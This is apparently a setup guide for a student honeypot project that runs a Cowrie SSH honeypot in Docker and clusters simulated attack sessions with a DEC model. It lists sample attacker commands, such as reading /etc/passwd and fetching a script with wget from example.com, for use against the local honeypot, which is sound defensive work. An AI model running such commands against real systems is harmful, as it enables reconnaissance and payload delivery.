# Setup Guide

This guide explains how to set up the Adaptive Zero-Day Honeypot project from scratch.

---

# Prerequisites

Install the following software:

- Docker Desktop
- WSL2 (Ubuntu)
- Git
- Python 3.11+

Verify installation:

```bash
docker --version
git --version
python3 --version
```

---

# Clone the Repository

```bash
git clone git@github.com:MadhumithraaTS/adaptive-zero-day-honeypot.git

cd adaptive-zero-day-honeypot
```

---

# Python Environment

Create a virtual environment.

```bash
python3 -m venv .venv
```

Activate it.

Linux / WSL

```bash
source .venv/bin/activate
```

Windows

```powershell
.venv\Scripts\activate
```

Install dependencies.

```bash
pip install -r requirements.txt
```

---

# Start the Cowrie Honeypot

Start Docker.

```bash
docker compose -f cowrie/docker-compose.yml up -d
```

Verify.

```bash
docker ps
```

You should see:

```
cowrie-project
```

---

# Run the Complete Pipeline Through Clustering

From the repository root, run a small test first:

```powershell
python -m pip install -r requirements.txt
python scripts/pipeline.py --sessions 5 --attack-username root --attack-password admin
```

The pipeline simulates sessions against Cowrie, collects and parses its logs, extracts and preprocesses features, then runs the saved DEC model. Cluster assignments and confidence scores are written to `data/processed/dec_results.csv`.

The username/password options use a pair shown to succeed in this Cowrie container's logs. Without them, the attack generator picks random credentials, so failed logins are expected. To keep random login attempts, omit both options.

To rerun the data-processing and clustering stages using the existing `data/raw/cowrie.json` without starting new simulated sessions:

```powershell
python scripts/pipeline.py --skip-attack --skip-collect
```

The DEC artifacts in `ml/cowrie_dec_integration_skeleton/ml/cowrie_dec/artifacts/` are required. Keep the pandas and scikit-learn versions in `requirements.txt` aligned with the versions used to create those artifacts.

---

# Connect to the Honeypot

Open another terminal.

```bash
ssh root@localhost -p 2223
```

Use any password.

Run a few commands.

```bash
whoami
pwd
ls
cat /etc/passwd
wget http://example.com/test.sh
exit
```

These commands simulate attacker activity.

---

# Stop Cowrie

```bash
docker compose down
```

---

# Git Workflow

Check changes.

```bash
git status
```

Add files.

```bash
git add .
```

Commit.

```bash
git commit -m "Your commit message"
```

Push.

```bash
git push
```

---

# Project Structure

```
zero_day_attacks/
│
├── cowrie/
├── scripts/
├── dataset/
├── parsed/
├── models/
├── notebooks/
├── docs/
│   ├── setup_guide.md
│   ├── report.pdf
│   └── presentation.pdf
│
├── docker-compose.yml
├── requirements.txt
└── README.md
```
